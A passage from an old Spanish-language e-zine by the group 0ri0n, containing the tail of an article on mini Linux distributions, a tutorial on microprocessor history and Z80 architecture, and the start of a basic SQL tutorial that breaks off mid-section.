    MicroLinux   > http://linux.hr/microlinux/
    Monkey Linux > http://www.spsselib.hiedu.cz/monkey/
    muLinux      > http://mulinux.nevalabs.org/
    PocketLinux  > http://pocket-linux.coven.vmh.net/index.html.en
    Pygmy Linux  > http://pygmy.penguin.cz/
    SmallLinux   > http://smalllinux.netpedia.net/
    Tomsrtbt     > http://www.toms.net/rb/
    Traveller's  > http://members.xoom.com/ror4/tlinux/
    Trinux       > http://www.trinux.org/
    Xdenu        > http://xdenu.tcm.hut.fi/
    ZipSlack     > http://www.slackware.com/zipslack/


    FAQ's de este Texto:
    --------------------

    1. Cuando trato de montar el fs me da error, porque?.
    R: Es porque no tienes activado la opcion de loopback en tu kernel.

    2. He creado un FS grande y cuando trato trabajarlo en una computadora
       con menos de 8MB de Ram no me corre?, porque sucede esto?.
    R: De Verdad que no se  decirte porque  pero a mi tambien  me  ha  dado
       problemas, te recomiendo que hagas otro filesystem de 4MB y lo metas
       en otro disko y luego lo montes cuando este lista la distri.

    3. Donde puedo conseguir mas informacion sobre esto:
    R: En Linuxdocs.org, insflug.org, lucas.hispalinux.es, linuxhq.com

    4. Que distribucion usa Usted?
    R: Actualmente Slackware 7.1


    Flames,    Basura   y    otros    quimicos   enviarlos    a    /dev/null
    Comentarios Constructivos, Criticas, Opiniones y demas Vergas enviarlo a
    dr0k@0ri0n.org


-[ 2x04 ]--------------------------------------------------------------------
-[ MicroProcesadores ]------------------------------------------[ Chica4xs ]-
------------------------------------------------------[ chica4xs@0ri0n.org ]-
  

  INTRODUCCION
  ============
  
  Hola Lector(es), pues bueno, este  texto tiene  como finalidad  ense~arle
  un  poquito  sobre  los  Microprocesadores  pero en especifico  sobre  la
  Z80; para  los proximos articulos  pues  le ense~are  como  programar  en 
  estos  tipos de arquitecturas  pero para ello deben manejar  los terminos
  basicos y su evolucion, espero que les guste y cualquier duda o sugerencia
  pueden hacerla via email, Ok.


  EL MICROPROCESADOR
  ==================

  Bueno, Se trata de una unidad  central de proceso contenida totalmente en 
  un circuito integrado. Comenzaba asi  la  gran carrera en busca de lo mas
  rapido, mas  peque~o; rapidamente  el  mundo  del computador empezo a ser
  accesible a peque~as empresas e incluso en el ambito domestico. Dentro de
  un Microprocesador encontramos:

  - La Unidad Logica-Aritmetica: Es  donde  se   efectuan  las  operaciones
    aritmeticas (suma, resta, y  a  veces  producto y division)  y  logicas
    (and, or, not, etc.).

  - El Decodificador de instrucciones: Alli se interpretan las instrucciones
    que van llegando y que componen el programa.

  - El Bloque de registros: Los registros son celdas  de memoria  en  donde
    queda almacenado  un  dato temporalmente. Existe  un  registro especial
    llamado  de  indicadores,  estado   o  flags, que  refleja   el  estado
    operativo del microprocesador.

  - El  Bloque  de  control de buses internos y externos: supervisa todo el
    proceso  de  transferencias de informacion dentro  del  microprocesador
    y fuera de el.


  CLASIFICACION DE LOS MICROPROCESADORES
  ======================================

  Existen   dos   criterios  principales   para  la  clasificacion  de  los
  microprocesadores, uno se basa en  la longitud de palabra y el otro en la
  tecnologia de fabricacion.

  La  longitud  de  palabra se refiere al numero de bits que puede procesar
  simultaneamente un microprocesador y esta determinado por su arquitectura,
  es  decir, por  el  tama~o de  los  registros, de  la  ALU y de los buses
  internos.

  La longitud de palabra de los microprocesadores ha ido creciendo a traves
  de  los  a~os,  desde los 4 bits del primer microprocesador hasta  los 32
  bits  de  los microprocesadores  mas recientes.  En la generalidad de los
  casos se utilizan  microprocesadores de 8 bits y de 16 bits, los primeros
  son  mas usuales  por  haber  sido  de mas temprana su aparicion y porque
  tienen disponible un amplio soporte de programacion y circuiteria.

  En   lo   que   toca  a  las  tecnologias  de  fabricacion, los  primeros
  microprocesadores  se   implantaron  con  tecnologia  PMOS, sin   embargo
  actualmente  la  tecnologia   de  fabricacion  de  microprocesadores  mas
  difundida  es  la  NMOS. Ultimamente  se   ha  desarrollado  bastante  la
  tecnologia CMOS para dispositivos con bajo consumo de energia.


  EVOLUCION DE LOS MICROPROCESADORES DE 8 BITS
  ============================================

  En 1971 la compa~ia Intel anuncio la aparicion del primer microprocesador
  denominado  el  4004.  Este  era  de  4 bits, estaba  implantado  con  la
  tecnologia PMOS, tenia 45 instrucciones y ejecutaba 60000 operaciones por
  segundo.

  Al  siguiente a~o, la misma compa~ia introdujo el 8008 que fue  el primer
  microprocesador  de  8 bits; tambien  implantado con tecnologia PMOS.  El
  8008, ademas  de  tener  una  longitud de palabra mayor, contaba  con  48
  instrucciones,  podia   ejecutar   300000   operaciones   por  segundo  y
  direccionaba  16 kbytes  de  memoria.  Sin embargo, para poder  funcionar
  requeria casi de 20 circuitos de soporte.

  Hasta  ese  momento, el  principal  objetivo de los microprocesadores era
  reemplazar  compuertas SSI  (small scale integration) y mSI (medium scale
  integration).


  EL MICROPROCESADOR 8080
  =======================
	
  Avances posteriores en la tecnologia de circuitos integrados, permitieron
  que a principios de 1974 Intel anunciara el 8080, un microprocesador de 8
  bits mucho mas poderoso.

  El 8080 tenia  78  instrucciones, en las cuales se incluian todas  las de
  8008. Ademas de su velocidad de operacion era diez veces mayor que la del
  8008  y  podia  direccionar hasta 64 Kbytes de memoria.  La tecnologia de
  fabricacion  usada  fue  la NMOS  y gran parte de la logica de soporte se
  incluyo  en  el  mismo  circuito  del microprocesador; gracias a esto era
  posible  construir  un sistema  con solo seis circuitos integrados.  Pero
  sobre  todo  la  principal  diferencia   del  8080  con  respecto  a  los
  microprocesadores  anteriores  era que no habia sido dise~ado simplemente
  para sustituir compuertas logicas, sino que  se le  habia  dotado con  la
  capacidad de una computadora.  Esto origino una revolucion tecnologica en
  el campo de la electronica digital.

  LA FAMILIA MOTOROLA
  ===================

  En respuesta al  exito  de 8080, la compa~ia Motorola introdujo tambien en
  1974 un microprocesador de 8 bits con 72 instrucciones, el 6800.  Al mismo
  tiempo   aparecio   una   familia   de   circuitos  perifericos  dise~ados
  especialmente para conectarse al microprocesador.

  En  1975,  la  compa~ia  Mos  Technology anuncio dos microprocesadores, el
  6501, toda  la circuiteria para generar la se~al de reloj.  Hasta entonces
  la   se~al   del  reloj  se  habia  generado  en  circuitos  externos   al
  microprocesador.

  Ed Roberts  construyo  en 1975 el Altair 8800 basandose en el 8080; aunque
  esta  maquina  no  tenia teclado ni pantalla (solo interruptores y luces),
  era una arquitectura abierta (conocida por todo el mundo) y cuyas tarjetas
  se conectaban a la placa  principal  a  traves de 100 terminales, que  mas
  tarde terminarian convirtiendose en el bus estandar S-100 de la industria.


  LOS MICROPROCESADORES Z-80 Y 8085
  =================================

  En 1976, la compa~ia Zilog introdujo el Z-80, un microprocesador NMOS de 8
  bits basado en el 8080 pero apreciablemente mejorado , tanto  en  software
  como en hardware.  El z-80 resulto ser un microprocesador mucho mas rapido
  y facil de usar, ya que solo requeria de una fuente de alimentacion  de  5
  volts y toda la circuiteria de soporte  estaba  incluida  en  el  circuito
  integrado.  Su codigo de instrucciones contenia las 78 del 8080, lo que le
  permitia  ejecutar todos los programas escritos para este ultimo, asi como
  80 instrucciones mas en total 158.

  Junto  con  el  microprocesador  Z-80  (Z80 CPU), Zilog  introdujo  varios
  circuitos perifericos, tales como el controlador  de puertos  en  paralelo
  (Z80 PIO), el  controlador  de puertos en serie (Z80 SIO)  y  el  circuito
  timer/contador (Z80 CTC).  Todos  ellos  quedaron  agrupados  dentro de la
  familia z-80.

  El  Apple-I aparecio en 1976, basado en el microprocesador de 8 bits 6502,
  en aquel entonces un recien aparecido aunque casi 10 veces mas  barato que
  el 8080 de Intel. Fue sucedido en 1977 por el Apple-II. el  Apple-II tenia
  un limite maximo de 48 Kbytes de memoria. En el mismo a~o, Commodore  saco
  su PET con 8 Kbytes. Se utilizaban cintas de casete  como  almacenamiento,
  aunque  comenzaron  a aparecer las unidades de disquete  de  51/4. Durante
  finales  de  los  70  aparecieron  muchos  otros  ordenadores, fruto de la
  explosion inicial del microprocesador.

  En 1977, Intel anuncio el microprocesador 8085, el cual combinaba el 8080,
  el  circuito  de reloj  y  el  controlador del sistema en un solo circuito
  integrado.  Al igual que el  Z-80, el 8085 estaba fabricado con tecnologia
  NMOS y requeria un voltaje  unico  de 5 voltios.  El 8085 se optimizo para
  que   pudiera   formar  un  sistema  completo   utilizando  dos  circuitos
  perifericos   especiales, uno  de  ellos  con  memoria  RAM,  puertos   de
  entrada/salida y un timer (8155 u 8156) y el otro con memoria  ROM o EPROM
  y  puertos (8355 u 8755).  Sin embargo, en programacion su aportacion  fue
  practicamente nula, ya que solo aumento en dos las instrucciones del 8080.


  LOS MICROS DE LOS 80's
  ======================

  En  1980, Sir  Clive Sinclair lanzo el ZX-80, seguido muy poco despues del
  ZX-81. Estaban basados en un microprocesador sucesor del 8085 de Intel: el
  Z80  (desarrollado  por  la  empresa  Zilog, creada por un ex-ingeniero de
  Intel). Commodore irrumpio  con sus VIC-20 y, posteriormente, el Commodore
  64, basados  aun  en  el 6502 y, este  ultimo, con  mejores  posibilidades
  graficas y unos  64 Kb  de memoria. Su  competidor  fue  el ZX-Spectrum de
  Sinclair,  tambien  basado  en el Z80, con un chip propio para gestion  de
  graficos  y  otras  tareas, la  ULA,  que  permitio  rebajar  su  coste  y
  multiplico  su  difusion  por  europa, y  en particular  por  Espa~a.  Sin
  embargo, todos los ordenadores domesticos de la epoca, como se  dieron  en
  llamar, estaban basados en procesadores de 8 bits y tenian el limite de 64
  Kb  de memoria. Los intentos de rebasar este limite manteniendo  aun  esos
  chips  por  parte  de la plataforma  MSX (supuesto estandar mundial con la
  misma suerte que ha corrido el Esperanto) o los CPC  de  Amstrad, de  poco
  sirvieron.


  El IBM PC
  =========

  Y  es  que IBM tambien fabrico su propio ordenador personal  con  vocacion
  profesional: el  12 de agosto de 1981 presento el IBM PC. Estaba basado en
  el microprocesador 8088, de 16 bits, El equipamiento de serie consistia en
  16  Kbytes  de memoria ampliables a 64 en la placa base (y a 256 a~adiendo
  tarjetas); el  almacenamiento externo se hacia en cintas de casete, aunque
  pronto aparecieron  las  unidades de disco de 51/4 pulgadas y simple  cara
  (160/180 Kb por disco) o doble cara (320/360 Kb). En 1983 aparecio  el IBM
  PC-XT, que traia como novedad un disco duro de 10 Mbytes. Un a~o mas tarde
  apareceria  el  IBM PC-AT, introduciendo el microprocesador 286, asi  como
  ranuras de expansion de 16 bits (el bus ISA de 16 bits) en  contraposicion
  con  las de 8 bits del PC y el XT (bus ISA de 8 bits), ademas  incorporaba
  un disco duro de 20 Mbytes y disquetes de 51/4 pero con 1.2 Mbytes.

  En  general, todos  los  equipos  con  procesador  286  o  superior pueden
  catalogarse  dentro  de la categoria AT; el termino XT hace referencia  al
  8088/8086 y similares.
  

  ARQUITECTURA DEL MICROPROCESADOR Z-80
  =====================================

  Las caracteristicas fundamentales del Z80 son: 

  1. El  transporte  de  se~ales  se  realiza  sobre tres buses, el  bus  de
     direcciones, el bus de datos, asi como el bus de control.
  2. Regimen de interrupcion uniforme, con la posibilidad  de  encadenar las
     prioridades de los circuitos perifericos.
  3. Alto grado de programabilidad. 
  4. Reloj unico. 
  5. Fuente de voltaje unica de +5 Volts. 

  Un  sistema  con  Z80 se completa con el empleo de  memorias  estandar  de
  lectura  y memorias estaticas o dinamicas de lectura  y  escritura, ademas
  pertenecen al sistema, puertos de entrada y salida paralelo, interfaces de
  comunicacion  serie, sistemas  contadores  temporizadores  y  circuitos de 
  acceso directo a memoria.

  El  funcionamiento  del  sistema  consiste  en  que las instrucciones  del
  microprocesador, que  estan  en la memoria ROM, se ejecutan en  una  forma
  secuencial  de  operacion, la fuente d e  datos  es, la  propia  CPU,  los
  perifericos o las memorias, la transferencia  interna de datos es a traves
  del CPU, exceptuando la transferencia  de  datos  en el proceso  de acceso
  directo a memoria.


  REGISTROS INTERNOS
  ==================

  La CPU Z-80 contiene 208 bits de memoria de lectura/escritura dividida  en
  18 registros de 8 bits y 4 registros de 16 bits.


  REGISTROS DE PROPOSITO GENERAL
  ==============================

  -------------------  -----------------
  | BANCO PRINCIPAL |  | BANCO ALTERNO |
  -------------------  -----------------
  |   A   |    F    |  |   A'  |   F'  |
  |   B   |    C    |  |   B'  |   C'  |
  |   D   |    E    |  |   D'  |   E'  |
  |   H   |    L    |  |   H'  |   L'  |
  -------------------  -----------------


  REGISTROS DE PROPOSITO ESPECIAL
  -------------------------------

  --------------------------------------------------------
  | VECTOR DE INTERRUPCIoN I  |  REFRESCADO DE MEMORIA R |
  --------------------------------------------------------
  |                   REGISTRO INDICE IX                 |
  |                   REGISTRO INDICE IY                 |
  |                    STACK POINTER  SP                 |
  |                   PROGRAM COUNTER  PC                |
  --------------------------------------------------------

  Los  registros  incluyen  dos  conjuntos  o  "bancos" de seis registros de
  proposito  general  que  pueden usarse individualmente como registros de 8
  bits o en pares como registros de 16 bits.  El banco principal consiste en
  los  registros  BC, DE  y  HL, en tanto que el banco alterno comprende los
  registros  B'C',  D'E' y  H'L' Tambien hay dos acumuladores (A y A') y dos
  registros  banderas (F y F' ).  Sin embargo solo es posible trabajar  a un
  tiempo  con  uno  de  los  bancos de registros.  En los registros  de  uso
  especifico  se  encuentran el contador de programa  (Program  Counter), el
  apuntador de pila (stack pointer), los registros indices(index registers),
  el registro  de  refrescado (refresh register) y el registro del vector de
  interrupcion (interrupt register).


  LA UNIDAD ARITMETICA Y LOGICA (ALU)
  ===================================

  La  unidad  aritmetico-logica  es  de  8 bits y ejecuta las  instrucciones
  aritmeticas y logicas de la CPU.  Internamente la ALU  se comunica con los
  registros y el bus externo de datos a traves  del bus interno de datos.

  Efectua las siguientes operaciones;

  1. Suma  (rotaciones  o desplazamientos  hacia  la  derecha  o  izquierda,
     aritmeticos o logicos).
  2. Operaciones logicas.
  3. Complementar a dos. 
  4. Registro de resultados importantes  como  el  acarreo,  signo,  acarreo
     auxiliar, paridad o si el resultado es zero.
  5. Comparaciones  
  6. Poner, Limpiar o probar un bit 
 

  LA UNIDAD DE CONTROL
  ====================

  Despues de obtener una instruccion de la memoria, se coloca en el registro
  de instrucciones y se decodifica.  La unidad de control lleva a cabo  esta
  funcion y luego genera  todas las se~ales de control para leer o  escribir
  datos en los registros, controlar la ALU y emitir las se~ales  de  control
  externas que se requieran.


  REGISTROS DE INDICE IX e IY
  ===========================

  Estos  son  registros de 16 bits cada uno y conservan direcciones base que
  se usan para modo de direccionamiento indexado, en este modo  un  registro
  de indice se usa como base para apuntar a una  region  de  la  memoria. La
  direccion efectiva de la localidad de memoria a donde se va a depositar el
  dato  o  de  donde se va a leer, se obtiene, al  sumar  el  contenido  del
  registro  de  indice  y  el  valor  de  8  bits  contenido en el campo  de
  "desplazamiento" de las instrucciones  que  emplean  direccionamiento  con
  indice, estos desplazamientos  se especifican con numeros enteros signados
  con el complemento a dos.


  REGISTRO DE INTERRUPCIONES
  ==========================

  El  Z80  opera  en  modo  de  interrupcion  en el que responde  como   una
  "llamada"  indirecta  en  respuesta  a  una solicitud de interrupcion.  El
  registro  I  se  usa  para  este  proposito  almacenando  los  8  bits mas
  significativos de la direccion indirecta mientras que el  dispositivo  que
  interrumpe  proporciona los 8 bits menos significativos  de  la  direccion
  indice, esta  caracteristica  permite  que las  rutinas  servicio  de  las
  interrupciones  se  localicen  en  cualquier parte de la memoria y  que se
  puedan accesar en un tiempo muy corto.
  

  EL CONTADOR DE PROGRAMA (PC)
  ============================

  Es un  registro  de  16 bits, que  continuamente tiene la direccion de  la
  localidad  de  memoria  siguiente que se va a  accesar, de  esa  localidad
  obtiene  el  codigo  d e la instruccion a ejecutarse, en la CPU el  PC  se
  incrementa en uno, cada  vez  que  el  microprocesador lee el codigo de la
  instruccion  contenida  en  la  localidad  direccionada, de esta  forma el
  contador  del  programa  direcciona secuencialmente las localidades  de la
  memoria ROM, donde se encuentra almacenado el programa.


  EL APUNTADOR DEL STACK (SP)
  ===========================

  El microprocesador Z80 cuenta con el registro de pila (SP) o stack pointer
  que  contiene  una direccion de memoria RAM a partir de la cual y en forma
  descendente, se  almacenan  los  contenidos  de  un par de registros, o  a
  partir  del  cual en forma ascendente se obtienen los ultimos dos datos de
  8  bits  almacenados  en  esa  area, el SP es un registro de 16 bits, para
  almacenar  en  el stack el contenido de un par de registros se utiliza  la
  instruccion PUSH y para cargar a un par de registros con  los  dos ultimos
  bytes del stack se utiliza la instruccion POP.


  PROGRAMACION ELEMENTAL
  ======================

  La  funcion de cualquier sistema  basado en un microprocesador se implanta
  por  medio  de  transferencias de datos entre los registros del  mismo, la
  memoria  y  los  dispositivos de entrada/salida, y de transformaciones  de
  datos  que ocurren  en los registros internos  del  microprocesador.   Las
  clases  de  transferencias y d e  transformaciones  que  son  posibles  se
  especifican  en  el codigo  de  instrucciones.  Cada microprocesador  esta
  dise~ado para ejecutar un codigo particular  de instrucciones.

  
  FORMATO DE LAS INSTRUCCIONES
  ============================

  Una  instruccion  especifica  la  operacion que debe ser realizada  por el
  microprocesador.  Cada  instruccion  esta  dividida en secciones o campos,
  donde  cada  campo  es un conjunto de bits que  proporcione  parte  de  la
  informacion requerida para saber  el  tipo  de  operacion a ejecutar  y la
  localizacion de los operandos  en  los  que  esta se realizara.  Desde  un
  punto   de  vista   simplificado, todas  las  instrucciones   pueden   ser
  representadas  como un codigo de operacion, seguido de campos  adicionales
  que  contienen los operandos de la  instruccion,  generalmente  constantes
  numericas o direcciones.

  El  codigo  de  operacion  determina la actividad que se llevara  a  cabo.
  Ademas indica cual  es  el contenido  de  las  siguientes  localidades  de
  memoria  en el programa, es decir, si contienen un dato, una direccion, un
  desplazamiento u  otro codigo de operacion.  Por razones de  eficiencia es
  conveniente  que  el  codigo de operacion resida totalmente en  la primera
  palabra  de  la  instruccion; este es un factor limitante en el numero  de
  instrucciones  disponibles  en  un microprocesador.  Cuando su longitud de
  palabra es de 8 bits, se  pueden  tener  hasta  256 codigos  de  operacion
  diferentes en un byte.

  En  el caso del Z-80, los codigos de operacion son en general, de un byte,
  a  excepcion  de  instrucciones  especiales  que  requieren  un  codigo de
  operacion  de  dos  bytes.  Tomando  en cuenta la informacion que necesita
  cada  instruccion  ademas del codigo  de  operacion, en  el  Z-80  existen
  instrucciones de uno, dos, tres o cuatros bytes.

  Por cada byte de  la instruccion, la unidad de control tiene que  realizar
  un ciclo maquina  durante el cual se lee este byte de la memoria.  Por  lo
  tanto, mientras mas corta sea una instruccion mas rapido Serra ejecutada.


  INSTRUCCIONES DE UN BYTE
  ========================

  Son las mas rapidas.  Un ejemplo comun es LD r,r' (cargar el contenido del
  registro  r'  en  el  registro  r), esta es una operacion  de  registro  a
  registro, la cual permite la transferencia de informacion entre dos de los
  registros internos del microprocesador .

  Cualquier  instruccion  debe  ser  representada  internamente  en  sistema
  binario.  La  expresion  LD r, r' es simbolica y  se denomina el MNEMONICO
  de  la  instruccion, sin  embargo, esta  es  la  forma mas conveniente  de
  mostrarle desde el punto de vista del programador.  El codigo binario  que
  constituye  esta  instruccion  dentro  de  la memoria  es  01DDDSSS.  Esta
  representacion  es todavia parcialmente simbolica.  Cada una de las letras
  S  y  D ocupa el lugar de un bit.  Las letras DDD se refieren a  los  tres
  bits que identifican al registro que actua como destino de la informacion.

  Estos  tres  bits permiten seleccionar uno de los ocho registros posibles.
  Por ejemplo la clave para el registro C es 001.

  De modo similar SSS representa los  tres  bits  que  apuntan  al registro
  donde se origina la transferencia de informacion.  La convencion  que  se
  sigue es que el registro r' es el origen y el registro r es el destino.

  Aun  cuando  aparentemente  el  mnemonico de la instruccion esta al reves
  (primero el destino y despues el origen),  se ha escogido esta convencion
  para mantener la compatibilidad con la notacion binaria, la cual  ha sido
  dise~ada para facilitarle la tarea a la unidad de control.

         -----------------
  BYTE 1 |COD. OPERACION |
         -----------------


  INSTRUCCIONES DE DOS BYTES
  --------------------------

  Algunas instrucciones requieren que un dato este inmediatamente despues del
  codigo de operacion; entonces son necesarios dos bytes.  Ejemplo:  la
  instruccion ADD A,n suma el contenido del segundo byte de la instruccion
  con el acumulador.  Este segundo byte es un dato o constante numerica que
  es tratado como un grupo de ocho bits sin ningun significado particular.

  El codigo binario de esta instruccion es 11000110 seguido de un dato de
  ocho bits.

         ------------------  ------------------
  BYTE 1 | COD. OPERACION |  | COD. OPERACION |
         ------------------  ------------------
  BYTE 2 | COD. OPERACION |  | DATOS          |
         ------------------  ------------------


  INSTRUCCIONES DE TRES BYTES
  ===========================

  En ocasiones, la instruccion puede necesitar la especificacion de alguna
  direccion.  Una direccion requiere 16 bits, o sea 2 bytes.  De lo anterior
  se desprende que, incluyendo el codigo de operacion, la instruccion es de
  tres bytes.

  Ejemplo:  la instruccion JP pq tiene como funcion producir un salto en el
  programa a la direccion se~alada por "pq".   En binario esta instruccion
  esta representada  por el codigo 11000011, seguido de 8 bits para el byte
  bajo de la direccion y 8 bits mas para el byte alto de la misma.

         ------------------ ------------------ ------------------
  BYTE 1 | COD. OPERACION | | COD. OPERACION | | COD. OPERACION |
         ------------------ ------------------ ------------------
  BYTE 2 | DATO BAJO      | | DIRECCION BAJA | | COD. OPERACION |
         ------------------ ------------------ ------------------ 
  BYTE 3 | DATO ALTO      | | DIRECCION ALTA | | DESPLAZAMIENTO |
         ------------------ ------------------ ------------------



  INSTRUCCIONES DE 4 BITS
  =======================

         ------------------ -------------------
  BYTE 1 | COD. OPERACION | | COD. OPERACION  |
         ------------------ -------------------
  BYTE 2 | COD. OPERACION | | COD. OPERACION  |
         ------------------ -------------------
  BYTE 3 | DATO ALTO      | | DIREACCION BAJA |
         ------------------ -------------------
  BYTE 4 | DATO BAJO      | | DIRECCION BAJA  |
         ------------------ -------------------

         ------------------ -------------------
  BYTE 1 | COD. OPERACION | | COD. OPERACION  |
         ------------------ -------------------
  BYTE 2 | COD. OPERACION | | COD. OPERACION  |
         ------------------ -------------------
  BYTE 3 | DESPLAZAMIENTO | | DESPLAZAMIENTO  |
         ------------------ -------------------
  BYTE 4 | DATO           | | COD. OPERACION  |
         ------------------ -------------------


  CLASES DE INSTRUCCIONES
  =======================

  Con  base  en  la funcion que desempe~an las instrucciones que es capaz de
  ejecutar el microprocesador z-80 se pueden agrupar en varias clases:


  INSTRUCCIONES DE TRANSFERENCIA DE DATOS
  =======================================

  Mueven  informacion  entre  los registros internos de la CPU, o  entre los
  registros   y  la  memoria  externa. Todas   estas   instrucciones   deben
  especificar  el lugar de donde la informacion Serra obtenida (origen) y el
  lugar donde Serra trasladada(destino).  Las instrucciones de transferencia
  de  datos en el z-80 se pueden agrupar en 5 categorias:  transferencias de
  8  bits, transferencias  de  16  bits, intercambios, operaciones de pila y
  transferencia de bloques.


  INSTRUCCIONES DE PROCESAMIENTO DE DATOS
  =======================================

  Operan sobre la informacion almacenada en el acumulador y otros  registros
  de proposito general o en localidades de memoria externa.  Los  resultados
  de  las  operaciones  se  colocan en el acumulador, y  el  estado  de  las
  banderas se determina de acuerdo con aquellos.

  Estas  instrucciones  incluyen: operaciones  aritmeticas (suma  y  resta),
  operaciones logicas (AND, OR, XOR, complemento), operaciones de incremento
  y  decremento, operaciones de rotacion y desplazamiento, y operaciones  de
  manipulacion de bits (set, reset, test).


  INSTRUCCIONES DE TRANSFERENCIA DE CONTROL
  =========================================

  Son  aquellas  que  trasladan  el  control del programa  a  una direccion
  determinada.  Estas instrucciones cambian el flujo normal de  ejecucion a
  otro en el que una seccion  diferente del programa es procesada.  Existen
  dos  tipos importantes de instrucciones de transferencia de control:  las
  que  trasladan  el  control  dentro  del  programa principal, denominadas
  saltos y las que temporalmente  lo  transfieren a una seccion o subrutina
  fuera  del programa principal.  La transferencia  de  control  puede  ser
  condicional o incondicional.


  INSTRUCCIONES DE ENTRADA / SALIDA
  =================================

  Permite una amplia gama de transferencia de datos entre las localidades de
  memoria  externa, los  registros  internos  de  proposito  general  y  los
  dispositivos externos de entrada/salida.


  INSTRUCCIONES DE CONTROL
  ========================

  Proporcionan  se~ales  de sincronizacion y pueden detener o interrumpir la
  ejecucion  de  un  programa.  Estas  instrucciones  afectan  el  modo   de
  operacion  de  la  CPU  o  manipulan  la informacion de su estado (status)
  interno.
  
  Bueno, para la proxima entrega de esta revista entraremos con la parte de
  Programacion.
  
  
  Se despide la Mujer consentida de 0ri0n .... Chica4xs 


-[ 2x05 ]--------------------------------------------------------------------
-[ Manejando SQL ]-----------------------------------------------[ ShAd0w5 ]-
-------------------------------------------------------[ shadow5@0ri0n.org ]-


  Por fin la  "sombra"  se aparecio en el E-zine del grupo 0ri0n, aqui estoy 
  con  un  articulo  interesante  e  importante  para nosotros amantes  a la
  computadora y por supuesto para nuestra necesidad.
  
  El lenguaje de consulta estructurado (SQL) es un lenguaje de base de datos
  normalizado,  en  este  caso  utilizaremos  ejemplos para el motor de base
  de  datos  de Microsoft Jet >:-(.  SQL  se  utiliza   para  crear  objetos
  y llevar un mejor control en una Base de Datos.
  
  En este capitulo vamos a empezar a conocer los fundamentos basicos del SQL
  como tambien los comandos, componentes, clausulas, operadores logicos, etc.
    
  Tambien  se  puede  utilizar  con el metodo Execute para crear y manipular
  directamente las bases de datos Jet y crear consultas SQL de paso a traves
  para manipular bases de datos remotas cliente - servidor. 

  
  1.1- Componentes del SQL
       -------------------
  El  lenguaje  SQL  esta  compuesto  por  comandos, clausulas, operadores y
  funciones  de agregado. Estos elementos  se  combinan en las instrucciones
  para crear, actualizar y manipular las bases de datos. 

  
  1.2- Comandos
       --------
  Existen dos tipos de comandos SQL: 
  
  los  DLL  que permiten crear  y  definir nuevas bases  de  datos, campos  e
  indices. los DML que permiten  generar  consultas  para  ordenar, filtrar y
  extraer datos de la base de datos. 
  
  Comandos DLL
  ------------

      CREATE: Utilizado para crear nuevas tablas, campos e indices.
      DROP  : Empleado para eliminar tablas e indices.
      ALTER : Utilizado para modificar las tablas agregando campos o
              cambiando la definicion de los campos.
 
  
  Comandos DML
  ------------

      SELECT: Utilizado para consultar registros de la base de datos que 
              satisfagan un criterio determinado.
      INSERT- Utilizado para cargar lotes de datos en la base de datos en
              una unica operacion.
      UPDATE - Utilizado para modificar los valores de los campos y
               registros  especificados.
      DELETE - Utilizado para eliminar registros de una tabla de una base
               de datos.

  1.3 Clausulas
      ---------
  Las clausulas son condiciones de modificacion utilizadas para definir los
  datos que desea seleccionar o manipular. 
  
      Clausulas
      ---------
            
      FROM     : Utilizada para especificar la tabla de la cual se van a
                 seleccionar los registros.
      WHERE    : Utilizada para especificar las condiciones que deben reunir
                 los registros que se van a seleccionar.
      GROUP BY : Utilizada para separar los registros seleccionados en
                 grupos especificos.
      HAVING   : Utilizada para expresar la condicion que debe satisfacer
                 cada grupo.
      ORDER BY : Utilizada para ordenar los registros seleccionados de
                 acuerdo con un orden especifico.

  1.4 Operadores Logicos
      ------------------
  
      Operador
      --------
      AND : Es el "y" logico. Evalua dos condiciones y devuelve un valor de
            verdad solo si ambas son ciertas.
      OR  : Es el "o" logico. Evalua dos condiciones y  devuelve un valor de
           verdar si alguna de las dos es cierta.
      NOT : Negacion logica. Devuelve el valor contrario de la expresion.


  1.5 Operadores de Comparacion
      -------------------------
  
      Operadores
      ----------
      < Menor que
      > Mayor que
      <> Distinto de
      <= Menor o Igual que
      >= Mayor o Igual que
      = Igual que

      BETWEEN : Utilizado para especificar un intervalo de valores.
      LIKE    : Utilizado en la comparacion de un modelo.
      In      : Utilizado para especificar registros de una base de datos.
       

  1.6 Funciones de Agregado
      ---------------------
  Las funciones de agregado se usan dentro de una clausula SELECT en grupos
  de registros para devolver  un  unico valor que se aplica  a  un grupo de
  registros.
  
  
      Funcion
      -------
      AVG   : Utilizada para calcular el promedio de los valores de un campo 
              determinado.
      COUNT : Utilizada para devolver el numero de registros de la seleccion 
      SUM   : Utilizada para  devolver la  suma  de  todos los valores de un
              campo determinado.
      MAX   : Utilizada para devolver el valor mas alto de un campo
              especificado.
      MIN   : Utilizada para devolver el valor mas bajo de un campo
              especificado.


  2.- Consultas de Seleccion
      ----------------------
  Las consultas de seleccion se utilizan para indicar  al motor de datos que 
  devuelva informacion de las bases de datos, esta  informacion  es devuelta
  en forma de conjunto de registros que se pueden  almacenar  en  un  objeto
  recordset.

  Este conjunto de registros es modificable.


  2.1.- Consultas basicas
        -----------------
  La sintaxis basica de una consulta de seleccion es la siguiente: 

  SELECT Campos FROM Tabla;

  En donde campos es la lista de campos que se deseen recuperar y tabla es el
  origen de los mismos, por ejemplo:

  SELECT Nombre, Telefono FROM Clientes;

  Esta consulta devuelve un recordset con el campo nombre y  telefono  de  la
  tabla clientes. 


  2.2.- Ordenar los registros
        ---------------------

  Adicionalmente se puede especificar el orden en que se desean recuperar los
  registros de las tablas mediante la clausula ORDER BY Lista  de  Campos. En
  donde Lista de campos representa los campos a ordenar. Ejemplo: 

  SELECT CodigoPostal, Nombre, Telefono FROM Clientes ORDER BY Nombre;

  Esta  consulta  devuelve  los  campos  CodigoPostal, Nombre, Telefono de la
  tabla Clientes ordenados por el campo Nombre. 

  Se pueden ordenar los registros por mas de un campo, como por ejemplo:

  SELECT CodigoPostal, Nombre, Telefono FROM Clientes ORDER BY
  CodigoPostal, Nombre;

  Incluso se puede especificar el orden de los registros: ascendente mediante
  la clausula (ASC -se toma este valor por defecto) o descendente (DESC)

  SELECT CodigoPostal, Nombre, Telefono FROM Clientes ORDER BY 
  CodigoPostal DESC , Nombre ASC; 


  2.3.- Consultas con Predicado
        -----------------------

  El predicado se incluye entre la clausula y el primer nombre  del  campo a
  recuperar, los posibles predicados son: 
  
  
  Predicado
  ---------
      ALL        : Devuelve todos los campos de la tabla.
      TOP        : Devuelve un determinado numero de registros de la tabla.
      DISTINCT   : Omite los registros cuyos campos seleccionados coincidan. 
                   totalmente.
      DISTINCTROW: Omite los registros duplicados basandose en la totalidad
                   del registro y no solo en los campos seleccionados.

  ALL
  ---
